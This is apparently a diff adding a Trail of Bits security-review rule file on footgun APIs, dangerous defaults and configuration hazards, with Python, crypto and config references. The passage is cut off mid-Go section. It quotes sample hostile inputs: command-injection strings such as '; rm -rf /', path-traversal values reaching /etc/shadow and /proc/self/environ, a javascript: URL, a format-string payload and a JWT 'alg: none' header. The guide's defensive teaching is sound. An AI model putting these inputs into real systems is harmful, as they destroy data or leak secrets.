@@ -1,0 +1,4906 @@
+---
+description: "Identifies error-prone APIs, dangerous configurations, and footgun designs that enable security mistakes. Use when reviewing API designs, configuration schemas, cryptographic library ergonomics, or evaluating whether code follows 'secure by default' and 'pit of success' principles. Triggers: footgun, misuse-resistant, secure defaults, API usability, dangerous configuration."
+globs: "*.c, *.cpp, *.go, *.h, *.hpp, *.js, *.jsx, *.move, *.py, *.rs, *.ts, *.tsx"
+alwaysApply: false
+---
+
+# sharp-edges
+
+*From Trail of Bits Skills - Author: Trail of Bits*
+
+# Sharp Edges Analysis
+
+Evaluates whether APIs, configurations, and interfaces are resistant to developer misuse. Identifies designs where the "easy path" leads to insecurity.
+
+## When to Use
+
+- Reviewing API or library design decisions
+- Auditing configuration schemas for dangerous options
+- Evaluating cryptographic API ergonomics
+- Assessing authentication/authorization interfaces
+- Reviewing any code that exposes security-relevant choices to developers
+
+## When NOT to Use
+
+- Implementation bugs (use standard code review)
+- Business logic flaws (use domain-specific analysis)
+- Performance optimization (different concern)
+
+## Core Principle
+
+**The pit of success**: Secure usage should be the path of least resistance. If developers must understand cryptography, read documentation carefully, or remember special rules to avoid vulnerabilities, the API has failed.
+
+## Rationalizations to Reject
+
+| Rationalization | Why It's Wrong | Required Action |
+|-----------------|----------------|-----------------|
+| "It's documented" | Developers don't read docs under deadline pressure | Make the secure choice the default or only option |
+| "Advanced users need flexibility" | Flexibility creates footguns; most "advanced" usage is copy-paste | Provide safe high-level APIs; hide primitives |
+| "It's the developer's responsibility" | Blame-shifting; you designed the footgun | Remove the footgun or make it impossible to misuse |
+| "Nobody would actually do that" | Developers do everything imaginable under pressure | Assume maximum developer confusion |
+| "It's just a configuration option" | Config is code; wrong configs ship to production | Validate configs; reject dangerous combinations |
+| "We need backwards compatibility" | Insecure defaults can't be grandfather-claused | Deprecate loudly; force migration |
+
+## Sharp Edge Categories
+
+### 1. Algorithm/Mode Selection Footguns
+
+APIs that let developers choose algorithms invite choosing wrong ones.
+
+**The JWT Pattern** (canonical example):
+- Header specifies algorithm: attacker can set `"alg": "none"` to bypass signatures
+- Algorithm confusion: RSA public key used as HMAC secret when switching RS256→HS256
+- Root cause: Letting untrusted input control security-critical decisions
+
+**Detection patterns:**
+- Function parameters like `algorithm`, `mode`, `cipher`, `hash_type`
+- Enums/strings selecting cryptographic primitives
+- Configuration options for security mechanisms
+
+**Example - PHP password_hash allowing weak algorithms:**
+```php
+// DANGEROUS: allows crc32, md5, sha1
+password_hash($password, PASSWORD_DEFAULT); // Good - no choice
+hash($algorithm, $password); // BAD: accepts "crc32"
+```
+
+### 2. Dangerous Defaults
+
+Defaults that are insecure, or zero/empty values that disable security.
+
+**The OTP Lifetime Pattern:**
+```python
+# What happens when lifetime=0?
+def verify_otp(code, lifetime=300):  # 300 seconds default
+    if lifetime == 0:
+        return True  # OOPS: 0 means "accept all"?
+        # Or does it mean "expired immediately"?
+```
+
+**Detection patterns:**
+- Timeouts/lifetimes that accept 0 (infinite? immediate expiry?)
+- Empty strings that bypass checks
+- Null values that skip validation
+- Boolean defaults that disable security features
+- Negative values with undefined semantics
+
+**Questions to ask:**
+- What happens with `timeout=0`? `max_attempts=0`? `key=""`?
+- Is the default the most secure option?
+- Can any default value disable security entirely?
+
+### 3. Primitive vs. Semantic APIs
+
+APIs that expose raw bytes instead of meaningful types invite type confusion.
+
+**The Libsodium vs. Halite Pattern:**
+
+```php
+// Libsodium (primitives): bytes are bytes
+sodium_crypto_box($message, $nonce, $keypair);
+// Easy to: swap nonce/keypair, reuse nonces, use wrong key type
+
+// Halite (semantic): types enforce correct usage
+Crypto::seal($message, new EncryptionPublicKey($key));
+// Wrong key type = type error, not silent failure
+```
+
+**Detection patterns:**
+- Functions taking `bytes`, `string`, `[]byte` for distinct security concepts
+- Parameters that could be swapped without type errors
+- Same type used for keys, nonces, ciphertexts, signatures
+
+**The comparison footgun:**
+```go
+// Timing-safe comparison looks identical to unsafe
+if hmac == expected { }           // BAD: timing attack
+if hmac.Equal(mac, expected) { }  // Good: constant-time
+// Same types, different security properties
+```
+
+### 4. Configuration Cliffs
+
+One wrong setting creates catastrophic failure, with no warning.
+
+**Detection patterns:**
+- Boolean flags that disable security entirely
+- String configs that aren't validated
+- Combinations of settings that interact dangerously
+- Environment variables that override security settings
+- Constructor parameters with sensible defaults but no validation (callers can override with insecure values)
+
+**Examples:**
+```yaml
+# One typo = disaster
+verify_ssl: fasle  # Typo silently accepted as truthy?
+
+# Magic values
+session_timeout: -1  # Does this mean "never expire"?
+
+# Dangerous combinations accepted silently
+auth_required: true
+bypass_auth_for_health_checks: true
+health_check_path: "/"  # Oops
+```
+
+```php
+// Sensible default doesn't protect against bad callers
+public function __construct(
+    public string $hashAlgo = 'sha256',  // Good default...
+    public int $otpLifetime = 120,       // ...but accepts md5, 0, etc.
+) {}
+```
+
+See [config-patterns.md](references/config-patterns.md#unvalidated-constructor-parameters) for detailed patterns.
+
+### 5. Silent Failures
+
+Errors that don't surface, or success that masks failure.
+
+**Detection patterns:**
+- Functions returning booleans instead of throwing on security failures
+- Empty catch blocks around security operations
+- Default values substituted on parse errors
+- Verification functions that "succeed" on malformed input
+
+**Examples:**
+```python
+# Silent bypass
+def verify_signature(sig, data, key):
+    if not key:
+        return True  # No key = skip verification?!
+
+# Return value ignored
+signature.verify(data, sig)  # Throws on failure
+crypto.verify(data, sig)     # Returns False on failure
+# Developer forgets to check return value
+```
+
+### 6. Stringly-Typed Security
+
+Security-critical values as plain strings enable injection and confusion.
+
+**Detection patterns:**
+- SQL/commands built from string concatenation
+- Permissions as comma-separated strings
+- Roles/scopes as arbitrary strings instead of enums
+- URLs constructed by joining strings
+
+**The permission accumulation footgun:**
+```python
+permissions = "read,write"
+permissions += ",admin"  # Too easy to escalate
+
+# vs. type-safe
+permissions = {Permission.READ, Permission.WRITE}
+permissions.add(Permission.ADMIN)  # At least it's explicit
+```
+
+## Analysis Workflow
+
+### Phase 1: Surface Identification
+
+1. **Map security-relevant APIs**: authentication, authorization, cryptography, session management, input validation
+2. **Identify developer choice points**: Where can developers select algorithms, configure timeouts, choose modes?
+3. **Find configuration schemas**: Environment variables, config files, constructor parameters
+
+### Phase 2: Edge Case Probing
+
+For each choice point, ask:
+- **Zero/empty/null**: What happens with `0`, `""`, `null`, `[]`?
+- **Negative values**: What does `-1` mean? Infinite? Error?
+- **Type confusion**: Can different security concepts be swapped?
+- **Default values**: Is the default secure? Is it documented?
+- **Error paths**: What happens on invalid input? Silent acceptance?
+
+### Phase 3: Threat Modeling
+
+Consider three adversaries:
+
+1. **The Scoundrel**: Actively malicious developer or attacker controlling config
+   - Can they disable security via configuration?
+   - Can they downgrade algorithms?
+   - Can they inject malicious values?
+
+2. **The Lazy Developer**: Copy-pastes examples, skips documentation
+   - Will the first example they find be secure?
+   - Is the path of least resistance secure?
+   - Do error messages guide toward secure usage?
+
+3. **The Confused Developer**: Misunderstands the API
+   - Can they swap parameters without type errors?
+   - Can they use the wrong key/algorithm/mode by accident?
+   - Are failure modes obvious or silent?
+
+### Phase 4: Validate Findings
+
+For each identified sharp edge:
+
+1. **Reproduce the misuse**: Write minimal code demonstrating the footgun
+2. **Verify exploitability**: Does the misuse create a real vulnerability?
+3. **Check documentation**: Is the danger documented? (Documentation doesn't excuse bad design, but affects severity)
+4. **Test mitigations**: Can the API be used safely with reasonable effort?
+
+If a finding seems questionable, return to Phase 2 and probe more edge cases.
+
+## Severity Classification
+
+| Severity | Criteria | Examples |
+|----------|----------|----------|
+| Critical | Default or obvious usage is insecure | `verify: false` default; empty password allowed |
+| High | Easy misconfiguration breaks security | Algorithm parameter accepts "none" |
+| Medium | Unusual but possible misconfiguration | Negative timeout has unexpected meaning |
+| Low | Requires deliberate misuse | Obscure parameter combination |
+
+## References
+
+**By category:**
+
+- **Cryptographic APIs**: See [references/crypto-apis.md](references/crypto-apis.md)
+- **Configuration Patterns**: See [references/config-patterns.md](references/config-patterns.md)
+- **Authentication/Session**: See [references/auth-patterns.md](references/auth-patterns.md)
+- **Real-World Case Studies**: See [references/case-studies.md](references/case-studies.md) (OpenSSL, GMP, etc.)
+
+**By language** (general footguns, not crypto-specific):
+
+| Language | Guide |
+|----------|-------|
+| C/C++ | [references/lang-c.md](references/lang-c.md) |
+| Go | [references/lang-go.md](references/lang-go.md) |
+| Rust | [references/lang-rust.md](references/lang-rust.md) |
+| Swift | [references/lang-swift.md](references/lang-swift.md) |
+| Java | [references/lang-java.md](references/lang-java.md) |
+| Kotlin | [references/lang-kotlin.md](references/lang-kotlin.md) |
+| C# | [references/lang-csharp.md](references/lang-csharp.md) |
+| PHP | [references/lang-php.md](references/lang-php.md) |
+| JavaScript/TypeScript | [references/lang-javascript.md](references/lang-javascript.md) |
+| Python | [references/lang-python.md](references/lang-python.md) |
+| Ruby | [references/lang-ruby.md](references/lang-ruby.md) |
+
+See also [references/language-specific.md](references/language-specific.md) for a combined quick reference.
+
+## Quality Checklist
+
+Before concluding analysis:
+
+- [ ] Probed all zero/empty/null edge cases
+- [ ] Verified defaults are secure
+- [ ] Checked for algorithm/mode selection footguns
+- [ ] Tested type confusion between security concepts
+- [ ] Considered all three adversary types
+- [ ] Verified error paths don't bypass security
+- [ ] Checked configuration validation
+- [ ] Constructor params validated (not just defaulted) - see [config-patterns.md](references/config-patterns.md#unvalidated-constructor-parameters)
+
+---
+
+## Additional References
+
+### Lang Python
+
+# Python Sharp Edges
+
+## Mutable Default Arguments
+
+```python
+# DANGEROUS: Default is shared across all calls
+def append_to(item, target=[]):
+    target.append(item)
+    return target
+
+append_to(1)  # [1]
+append_to(2)  # [1, 2] - same list!
+append_to(3)  # [1, 2, 3]
+
+# Also affects dicts and other mutables
+def register(name, registry={}):
+    registry[name] = True
+    return registry
+```
+
+**The Problem**: Default arguments are evaluated once at function definition, not at each call.
+
+**Fix**: Use `None` sentinel:
+```python
+def append_to(item, target=None):
+    if target is None:
+        target = []
+    target.append(item)
+    return target
+```
+
+## Eval, Exec, and Code Execution
+
+```python
+# DANGEROUS: Arbitrary code execution
+eval(user_input)      # Executes Python expression
+exec(user_input)      # Executes Python statements
+
+# DANGEROUS: compile + exec
+code = compile(user_input, '<string>', 'exec')
+exec(code)
+
+# DANGEROUS: input() in Python 2
+# In Python 2: input() == eval(raw_input())
+# Python 2 code taking input() from users = RCE
+
+# DANGEROUS: Dynamic import
+__import__(user_input)
+importlib.import_module(user_input)
+```
+
+**Also Dangerous**:
+- `pickle.loads()` - arbitrary code execution
+- `yaml.load()` - arbitrary code execution (use `safe_load`)
+- `subprocess.Popen(shell=True)` with user input
+
+## Late Binding Closures
+
+```python
+# DANGEROUS: Closures capture variable by reference, not value
+funcs = []
+for i in range(3):
+    funcs.append(lambda: i)
+
+[f() for f in funcs]  # [2, 2, 2] - all see final i
+
+# Same with list comprehension
+funcs = [lambda: i for i in range(3)]
+[f() for f in funcs]  # [2, 2, 2]
+```
+
+**Fix**: Capture by value using default argument:
+```python
+funcs = []
+for i in range(3):
+    funcs.append(lambda i=i: i)  # i=i captures current value
+
+[f() for f in funcs]  # [0, 1, 2]
+```
+
+## Identity vs Equality
+
+```python
+# DANGEROUS: 'is' checks identity, not equality
+a = 256
+b = 256
+a is b  # True - CPython caches small integers [-5, 256]
+
+a = 257
+b = 257
+a is b  # False - different objects!
+
+# String interning is also unpredictable
+s1 = "hello"
+s2 = "hello"
+s1 is s2  # True - interned
+
+s1 = "hello world"
+s2 = "hello world"
+s1 is s2  # Maybe - depends on context
+
+# DANGEROUS in conditionals
+if x is True:   # Wrong - use: if x is True (for singletons only)
+if x is 1:      # Wrong - use: if x == 1
+```
+
+**Rule**: Use `is` only for `None`, `True`, `False`, and explicit singleton checks.
+
+## Import Shadowing
+
+```python
+# DANGEROUS: Naming your file same as stdlib module
+# File: random.py
+import random
+print(random.randint(1, 10))  # ImportError or recursion!
+
+# Your random.py shadows the stdlib random module
+
+# Similarly dangerous names:
+# - email.py (shadows email module)
+# - test.py (shadows test framework)
+# - types.py (shadows types module)
+```
+
+## Exception Handling Pitfalls
+
+```python
+# DANGEROUS: Bare except catches everything
+try:
+    risky_operation()
+except:  # Catches KeyboardInterrupt, SystemExit, etc.
+    pass
+
+# DANGEROUS: Catching Exception still misses some
+try:
+    risky_operation()
+except Exception:  # Misses KeyboardInterrupt, SystemExit
+    pass
+
+# DANGEROUS: Silently swallowing
+try:
+    important_security_check()
+except SomeError:
+    pass  # Security check failure ignored!
+
+# DANGEROUS: Exception in except block
+try:
+    operation()
+except SomeError as e:
+    log(e)  # If log() raises, original exception lost
+    raise
+```
+
+## Name Rebinding in Loops
+
+```python
+# DANGEROUS: Reusing loop variable
+for item in items:
+    process(item)
+
+# Later in same scope:
+print(item)  # Still bound to last item!
+
+# DANGEROUS with exceptions
+for item in items:
+    try:
+        process(item)
+    except Exception as e:
+        pass
+
+# In Python 3, 'e' is deleted after except block
+# But 'item' persists
+```
+
+## Class vs Instance Attributes
+
+```python
+# DANGEROUS: Mutable class attribute shared by all instances
+class User:
+    permissions = []  # Class attribute - shared!
+
+u1 = User()
+u2 = User()
+u1.permissions.append('admin')
+print(u2.permissions)  # ['admin'] - u2 is also admin!
+```
+
+**Fix**: Initialize in `__init__`:
+```python
+class User:
+    def __init__(self):
+        self.permissions = []  # Instance attribute - unique
+```
+
+## String Formatting Injection
+
+```python
+# DANGEROUS: Format string with user data as format spec
+template = user_input  # "{0.__class__.__mro__[1].__subclasses__()}"
+template.format(some_object)  # Can access arbitrary attributes!
+
+# DANGEROUS: f-string with user input (if using eval)
+eval(f'f"{user_input}"')  # Code execution
+
+# DANGEROUS: % formatting with user-controlled format
+user_template % (data,)  # Less dangerous but still risky
+```
+
+**Fix**: Use string concatenation or safe templating (Jinja2 with autoescape).
+
+## Numeric Precision
+
+```python
+# DANGEROUS: Float comparison
+0.1 + 0.2 == 0.3  # False!
+# 0.1 + 0.2 = 0.30000000000000004
+
+# DANGEROUS: Large integer to float
+n = 10**20
+float(n) == float(n + 1)  # True - precision loss
+
+# DANGEROUS: Division in Python 2
+# 5 / 2 = 2 (integer division in Python 2)
+# 5 / 2 = 2.5 (float division in Python 3)
+```
+
+## Unpacking Pitfalls
+
+```python
+# DANGEROUS: Unpacking user-controlled data
+a, b, c = user_list  # ValueError if wrong length
+
+# Can be used for DoS:
+# Send list with 10 million elements to function expecting 3
+# Python will iterate entire list before raising ValueError
+```
+
+## Subprocess Shell Injection
+
+```python
+# DANGEROUS: shell=True with user input
+import subprocess
+subprocess.run(f"ls {user_input}", shell=True)
+# user_input = "; rm -rf /" → command injection
+
+# SAFE: Use list form without shell
+subprocess.run(["ls", user_input])  # user_input is just an argument
+```
+
+## Attribute Access on None
+
+```python
+# DANGEROUS: Chained access without checks
+result = api.get_user().profile.settings.theme
+# Any None in chain causes AttributeError
+
+# Python doesn't have optional chaining like JS (?.)
+# Must check each step or use getattr with default
+```
+
+## Detection Patterns
+
+| Pattern | Risk |
+|---------|------|
+| `def f(x=[])` or `def f(x={})` | Mutable default argument |
+| `eval(`, `exec(`, `compile(` | Code execution |
+| `pickle.loads(`, `yaml.load(` | Deserialization RCE |
+| `lambda: var` in loop | Late binding closure |
+| `x is 1`, `x is "string"` | Identity vs equality confusion |
+| `import x` where x.py exists locally | Import shadowing |
+| `except:` or `except Exception:` | Over-broad exception catching |
+| `class Foo: bar = []` | Shared mutable class attribute |
+| `template.format(obj)` with user template | Format string injection |
+| `subprocess.*(..., shell=True)` | Command injection |
+
+
+### Crypto Apis
+
+# Cryptographic API Footguns
+
+Detailed patterns for identifying misuse-prone cryptographic interfaces.
+
+## Algorithm Selection Anti-Patterns
+
+### The "alg" Header Attack (JWT)
+
+The JSON Web Token standard allows the token itself to specify which algorithm to use for verification. This is catastrophically wrong.
+
+**Attack 1: "none" algorithm**
+```json
+{"alg": "none", "typ": "JWT"}
+```
+Many libraries accept this and skip signature verification entirely.
+
+**Attack 2: Algorithm confusion (RS256 → HS256)**
+- Server expects RSA signature, uses public key for verification
+- Attacker changes algorithm to HMAC, uses *public key* as HMAC secret
+- Public key is public, so attacker can forge valid signatures
+
+**Root cause**: Trusting untrusted input to select security mechanisms.
+
+**Fix**: Never let data dictate algorithm. Use one algorithm, hardcoded.
+
+### Cipher Mode Parameters
+
+```python
+# DANGEROUS: mode is selectable
+def encrypt(plaintext, key, mode="ECB"):  # ECB is never correct
+    ...
+
+# BAD: accepts any OpenSSL cipher string
+cipher = OpenSSL::Cipher.new(user_selected_cipher)
+
+# GOOD: no parameters
+def encrypt(plaintext, key):  # internally uses AES-256-GCM
+    ...
+```
+
+**Detection**: Parameters named `mode`, `cipher`, `algorithm`, `hash_type`
+
+### Hash Algorithm Downgrade
+
+```php
+// PHP's hash() accepts ANY algorithm
+hash("crc32", $password);  // Valid call, terrible security
+hash("md5", $password);    // Valid call, broken security
+hash("sha256", $password); // Valid call, still wrong for passwords
+
+// Password functions limit choices
+password_hash($password, PASSWORD_ARGON2ID);  // Better
+```
+
+**Pattern**: APIs that accept algorithm as string instead of restricting to safe subset.
+
+## Key/Nonce/IV Confusion
+
+### Indistinguishable Byte Arrays
+
+```go
+// All three are just []byte - easy to swap
+func Encrypt(plaintext, key, nonce []byte) []byte
+
+// Easy mistakes:
+Encrypt(plaintext, nonce, key)  // Swapped - compiles fine
+Encrypt(plaintext, key, key)    // Reused key as nonce - compiles fine
+```
+
+**Fix**: Distinct types
+
+```go
+type EncryptionKey [32]byte
+type Nonce [24]byte
+
+func Encrypt(plaintext []byte, key EncryptionKey, nonce Nonce) []byte
+// Now type system catches swaps
+```
+
+### Nonce Reuse
+
+```python
+# DANGEROUS: nonce parameter with no guidance
+def encrypt(plaintext, key, nonce):
+    ...
+
+# Developer "simplifies" by reusing:
+nonce = b'\x00' * 12
+encrypt(msg1, key, nonce)
+encrypt(msg2, key, nonce)  # Catastrophic with GCM/ChaCha
+```
+
+**Fix**: Generate nonces internally, return them with ciphertext.
+
+## Comparison Footguns
+
+### Timing-Safe vs. Regular Comparison
+
+```python
+# These look identical but have different security properties
+if computed_mac == expected_mac:  # VULNERABLE: timing attack
+if hmac.compare_digest(computed_mac, expected_mac):  # Safe
+```
+
+**The problem**: Developers don't know to use special comparison. Default string equality is vulnerable.
+
+**Detection**: Direct equality checks on MACs, signatures, hashes, tokens.
+
+### Boolean Confusion
+
+```python
+# Signature verification APIs
+result = verify(signature, message, key)
+
+# Some return True/False
+if verify(...):  # Must check return value
+
+# Some raise exceptions
+verify(...)  # Failure = exception, no return to check
+
+# Developers mixing these up = vulnerabilities
+```
+
+## Padding Oracle Enablers
+
+### Raw Decryption APIs
+
+```python
+# DANGEROUS: returns plaintext even if padding invalid
+def decrypt(ciphertext, key):
+    # ... decrypt ...
+    return unpad(plaintext)  # Throws on bad padding
+
+# Attacker can distinguish:
+# - Valid padding → success
+# - Invalid padding → exception
+
+# This distinction enables padding oracle attacks
+```
+
+**Fix**: Decrypt-then-MAC (or authenticated encryption). Never expose padding validity.
+
+### Error Message Differentiation
+
+```
+# DANGEROUS error messages
+"Invalid padding"           # Padding oracle signal
+"MAC verification failed"   # Different error = oracle
+"Decryption failed"         # Good: single error for all failures
+```
+
+## Key Derivation Footguns
+
+### Using Hashes Instead of KDFs
+
+```python
+# DANGEROUS: hash is not a KDF
+key = hashlib.sha256(password.encode()).digest()
+
+# Developer reasoning: "SHA-256 is secure"
+# Reality: Fast hash enables brute force
+
+# CORRECT: use actual KDF
+key = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1)
+```
+
+### Password Storage Misuse
+
+```python
+# DANGEROUS: encryption is not password storage
+encrypted_password = encrypt(password, master_key)
+# Compromise of master_key = all passwords exposed
+
+# CORRECT: one-way hash with salt
+hashed_password = argon2.hash(password)
+# No key to steal; each password salted differently
+```
+
+## Safe API Design Checklist
+
+For cryptographic APIs, verify:
+
+- [ ] **No algorithm selection**: One safe algorithm, hardcoded
+- [ ] **No mode selection**: GCM/ChaCha20-Poly1305 only, no ECB/CBC
+- [ ] **Distinct types**: Keys, nonces, ciphertexts are different types
+- [ ] **Internal nonce generation**: Don't require developer to provide
+- [ ] **Authenticated encryption**: Encrypt-then-MAC or AEAD built in
+- [ ] **Constant-time comparison**: Default or only comparison method
+- [ ] **Uniform errors**: Same error for all decryption failures
+- [ ] **KDF for passwords**: Argon2/scrypt/bcrypt, not raw hashes
+
+
+### Config Patterns
+
+# Configuration Security Patterns
+
+Dangerous configuration patterns that enable security failures.
+
+## Zero/Empty/Null Semantics
+
+### The Lifetime Zero Problem
+
+```yaml
+# What does 0 mean?
+session_timeout: 0    # Infinite timeout? Immediate expiry? Disabled?
+token_lifetime: 0     # Never expires? Already expired? Use default?
+max_attempts: 0       # No attempts allowed? Unlimited attempts?
+```
+
+**Real-world failures:**
+- OTP libraries where `lifetime=0` means "accept any OTP regardless of age"
+- Rate limiters where `max_attempts=0` disables rate limiting
+- Session managers where `timeout=0` means "session never expires"
+
+**Detection**: Any numeric security parameter that accepts 0.
+
+**Fix**: Explicit constants, validation, or separate enable/disable flag.
+
+```python
+# BAD
+def verify_otp(code: str, lifetime: int = 300):
+    if lifetime <= 0:
+        return True  # What??
+
+# GOOD
+def verify_otp(code: str, lifetime: int = 300):
+    if lifetime <= 0:
+        raise ValueError("lifetime must be positive")
+```
+
+### Empty String Bypass
+
+```python
+# Passwords
+if user_password == stored_hash:  # What if stored_hash is ""?
+
+# API keys
+if api_key == config.api_key:  # What if config is empty?
+    grant_access()
+
+# The empty string equals the empty string
+"" == ""  # True - authentication bypassed
+```
+
+**Detection**: String comparisons for authentication without empty checks.
+
+### Null as "Skip"
+
+```javascript
+// DANGEROUS: null means "skip verification"
+function verifySignature(data, signature, publicKey) {
+    if (!publicKey) return true;  // No key = trust everything?
+    return crypto.verify(data, signature, publicKey);
+}
+
+// DANGEROUS: null means "any value"
+function checkRole(user, requiredRole) {
+    if (!requiredRole) return true;  // No requirement = allow all?
+    return user.roles.includes(requiredRole);
+}
+```
+
+## Boolean Traps
+
+### Security-Disabling Flags
+
+```yaml
+# Every one of these has caused real vulnerabilities
+verify_ssl: false
+validate_certificate: false
+check_signature: false
+require_auth: false
+enable_csrf_protection: false
+sanitize_input: false
+```
+
+**Pattern**: Any boolean that disables a security control.
+
+**The typo problem:**
+```yaml
+verify_ssl: fasle   # Typo - what does the parser do?
+verify_ssl: "false" # String "false" - truthy in many languages!
+verify_ssl: 0       # Integer 0 - falsy, but is it valid?
+```
+
+### Double Negatives
+
+```yaml
+# Confusing
+disable_auth: false      # Auth enabled? Let me re-read...
+skip_validation: false   # Validation runs? Think carefully...
+
+# Clear
+auth_enabled: true
+validate_input: true
+```
+
+## Magic Values
+
+### Sentinel Values in Security Parameters
+
+```yaml
+# What do these mean?
+max_retries: -1      # Infinite? Error? Use default?
+cache_ttl: -1        # Never expire? Disabled?
+timeout_seconds: -1  # Wait forever? Use system default?
+
+# Real vulnerability: connection pool with max_connections: -1
+# meant "unlimited" - enabled DoS via connection exhaustion
+```
+
+### Special String Values
+
+```yaml
+# Dangerous patterns
+allowed_origins: "*"       # CORS wildcard
+allowed_hosts: "any"       # Bypass host validation
+log_level: "none"          # Disable security logging
+password_policy: "disabled" # No password requirements
+```
+
+**Detection**: String configs that accept wildcards or "disable" keywords.
+
+## Combination Hazards
+
+### Conflicting Settings
+
+```yaml
+# Both true - which wins?
+require_authentication: true
+allow_anonymous_access: true
+
+# Both specified - conflict
+session_cookie_secure: true
+force_http: true  # HTTP can't use Secure cookies
+
+# Mutually exclusive
+encryption_key: "..."
+encryption_disabled: true
+```
+
+### Precedence Confusion
+
+```yaml
+# In config file
+verify_ssl: true
+
+# But overrideable by environment?
+VERIFY_SSL=false  # Which wins?
+
+# And command line?
+--no-verify-ssl   # Now there are three sources
+```
+
+**Fix**: Document precedence clearly; warn on conflicts; fail on contradictions.
+
+## Environment Variable Hazards
+
+### Sensitive Values in Environment
+
+```bash
+# Common but problematic
+export DATABASE_PASSWORD="secret"
+export API_KEY="sk_live_xxx"
+
+# Risks:
+# - Visible in process listings (ps aux)
+# - Inherited by child processes
+# - Logged in error dumps
+# - Visible in container inspection
+```
+
+### Override Attacks
+
+```python
+# Application trusts environment
+debug = os.environ.get("DEBUG", "false") == "true"
+
+# Attacker with environment access:
+export DEBUG=true  # Enables verbose logging of secrets
+```
+
+**Detection**: Security settings controllable via environment without validation.
+
+## Path Traversal via Config
+
+### Unrestricted Path Configuration
+
+```yaml
+# User-controlled paths
+log_file: "../../../etc/passwd"
+upload_dir: "/etc/nginx/conf.d/"
+template_dir: "../../../etc/shadow"
+
+# Even "read-only" paths can leak secrets
+config_include: "/etc/shadow"
+certificate_file: "/proc/self/environ"
+```
+
+**Fix**: Validate paths; restrict to allowed directories; resolve and check.
+
+## Unvalidated Constructor Parameters
+
+Configuration/parameter classes that accept security-relevant values without validation create "time bombs" - the insecure value is accepted silently at construction, then explodes later during use.
+
+### Algorithm Selection Without Allowlist
+
+```php
+// DANGEROUS: Accepts any string including weak algorithms
+readonly class ServerConfig {
+    public function __construct(
+        public string $hashAlgo = 'sha256',  // Accepts 'md5', 'crc32', 'adler32'
+        public string $cipher = 'aes-256-gcm', // Accepts 'des', 'rc4'
+    ) {}
+}
+
+// Caller can pass insecure values:
+new ServerConfig(hashAlgo: 'md5');  // Silently accepted!
+```
+
+**Detection**: Constructor parameters named `algo`, `algorithm`, `hash*`, `cipher`, `mode`, `*_type` that accept strings without validation.
+
+**Fix**: Validate against an explicit allowlist at construction:
+
+```php
+public function __construct(public string $hashAlgo = 'sha256') {
+    if (!in_array($hashAlgo, ['sha256', 'sha384', 'sha512'], true)) {
+        throw new InvalidArgumentException("Disallowed hash algorithm: $hashAlgo");
+    }
+}
+```
+
+### Timing Parameters Without Bounds
+
+```php
+// DANGEROUS: No minimum or maximum bounds
+readonly class AuthConfig {
+    public function __construct(
+        public int $otpLifetime = 120,     // Accepts 0 (immediate expiry? infinite?)
+        public int $sessionTimeout = 3600, // Accepts -1 (what does this mean?)
+        public int $maxRetries = 5,        // Accepts 0 (no retries? unlimited?)
+    ) {}
+}
+
+// All of these are silently accepted:
+new AuthConfig(otpLifetime: 0);      // OTP always expired or never expires?
+new AuthConfig(otpLifetime: 999999); // ~11 days - replay attacks!
+new AuthConfig(maxRetries: -1);      // Unlimited retries = brute force
+```
+
+**Detection**: Numeric constructor parameters for `*lifetime`, `*timeout`, `*ttl`, `*duration`, `max_*`, `min_*`, `*_seconds`, `*_attempts` without range validation.
+
+**Fix**: Enforce both minimum AND maximum bounds:
+
+```php
+public function __construct(public int $otpLifetime = 120) {
+    if ($otpLifetime < 2) {
+        throw new InvalidArgumentException("OTP lifetime too short (min: 2 seconds)");
+    }
+    if ($otpLifetime > 300) {
+        throw new InvalidArgumentException("OTP lifetime too long (max: 300 seconds)");
+    }
+}
+```
+
+### Hostname/URL Parameters Without Validation
+
+```php
+// DANGEROUS: No format validation
+readonly class NetworkConfig {
+    public function __construct(
+        public string $hostname = 'localhost',  // Accepts anything
+        public string $callbackUrl = '',        // Accepts malformed URLs
+    ) {}
+}
+
+// Silently accepted:
+new NetworkConfig(hostname: '../../../etc/passwd');
+new NetworkConfig(hostname: 'localhost; rm -rf /');
+new NetworkConfig(callbackUrl: 'javascript:alert(1)');
+```
+
+**Detection**: String constructor parameters named `host`, `hostname`, `domain`, `*_url`, `*_uri`, `endpoint`, `callback*` without validation.
+
+**Fix**: Validate format at construction:
+
+```php
+public function __construct(public string $hostname = 'localhost') {
+    if (!filter_var($hostname, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
+        throw new InvalidArgumentException("Invalid hostname: $hostname");
+    }
+}
+```
+
+### The "Sensible Default" Trap
+
+Having a secure default does NOT protect you - callers can override it:
+
+```php
+// Default is secure...
+public function __construct(
+    public string $hashAlgo = 'sha256'  // Good default!
+) {}
+
+// ...but callers can still shoot themselves
+$config = new Config(hashAlgo: 'md5');  // Oops
+```
+
+**The rule**: If a parameter affects security, validate it. Defaults only help developers who don't specify a value; validation protects everyone.
+
+## Configuration Validation Checklist
+
+For configuration schemas, verify:
+
+- [ ] **Zero/empty rejected**: Numeric security params require positive values
+- [ ] **No empty passwords/keys**: Empty string authentication forbidden
+- [ ] **No security-disabling booleans**: Or require confirmation/separate config
+- [ ] **No magic values**: -1 and wildcards have defined, safe meanings
+- [ ] **Conflict detection**: Contradictory settings produce errors
+- [ ] **Precedence documented**: Clear order when multiple sources exist
+- [ ] **Path validation**: User-provided paths restricted to safe directories
+- [ ] **Type strictness**: "false" string not silently converted to boolean
+- [ ] **Deprecation warnings**: Insecure legacy options warn loudly
+- [ ] **Algorithm allowlist**: Crypto algorithm params validated against safe options
+- [ ] **Timing bounds**: Lifetime/timeout params have both min AND max limits
+- [ ] **Hostname/URL validation**: Network addresses validated at construction
+- [ ] **Constructor validation**: All security params validated, not just defaulted
+
+
+### Lang Go
+
+# Go Sharp Edges
+
+## Silent Integer Overflow
+
+```go
+// DANGEROUS: Overflow wraps silently (no panic!)
+var x int32 = math.MaxInt32
+x = x + 1  // Wraps to -2147483648, no error
+
+// Real vulnerability pattern: size calculations
+func allocate(count int32, size int32) []byte {
+    total := count * size  // Can overflow!
+    return make([]byte, total)  // Tiny allocation
+}
+```
+
+**The Problem**: Unlike Rust (debug panics), Go silently wraps. Fuzzing with go-fuzz may never find overflow bugs because they don't crash.
+
+**Detection**: Arithmetic on integer types, especially:
+- Multiplication for size calculations
+- Addition near max values
+- Conversions between integer sizes
+
+**Mitigation**: Use `math/bits` overflow-checking functions or check manually.
+
+## Slice Aliasing
+
+```go
+// DANGEROUS: Slices share backing array
+original := []int{1, 2, 3, 4, 5}
